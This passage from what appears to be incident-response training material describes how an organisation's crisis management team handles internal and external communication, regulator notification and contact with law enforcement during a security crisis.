whether the environment can switch to DR. You will know what the impact 
would be if you have to take critical assets in the environment offline.

This
 information must be clearly communicated to the CMT to ensure they can 
make an informed decision. Without SMEs, it would be impossible to 
recover from a crisis.

**The Actions Available to the CMT**

Apart
 from the technical response the CMT can take to deal with the crisis, 
there are other actions that the team needs to consider and potentially 
take. Some actions will help the team control the narrative, while 
others may be required by law.

# Internal Communication

The
 CMT will have to decide what communication will be sent internally. 
This doesn't just include messages that will go to employees, but also 
communication that is prepared for key divisions such as the help desk. 
Depending on the technical response taken by the CMT, the help desk 
might receive an influx of support queries. To ensure that the help desk
 can assist employees and to limit the spread of panic, the CMT will 
also prepare communication for this team. While the team can create this
 communication during the crisis, it is often not recommended as limited
 time is available which could lead to mistakes. Rather, the team should
 have already prepared holding statements that can simply be tweaked 
before being distributed.

# External Communication

External
 communication is just as important. Again, this does not just cover the
 communication that is sent directly to customers, but also 
communication such as comments to the press or interviews that will be 
performed. This component has become vital and incredibly difficult to 
navigate in today's time due to social media. Often, organisations will 
employ teams that will specifically take care of this communication 
during an incident to help ensure that the public is informed about what
 is happening without spreading fear and panic, which could cause 
reputational damage to the organisation.

# Informing the Regulator

Depending
 on the category of the organisation, there may be the need to inform 
other third parties. For example, in the financial sector, organisations
 are usually required by law to notify their respective regulator if 
there is a crisis. This is because the crisis could have an impact on 
the entire country. Another common regulator that must be informed 
during a crisis is the information regulator if the crisis has resulted 
in the breach of customer information in countries that have to adhere 
to laws such as GDPR.

# Contacting Law Enforcement

Also,
 depending on the country of the organisation, there may be a need to 
contact law enforcement agencies, for example, the FBI. Usually, these 
processes are defined by the CMT before a crisis and will be part of 
their playbooks. Law enforcement agencies can often help with the 
investigation and help to ensure that the chain of custody of forensic 
evidence is followed to help with prosecution later.
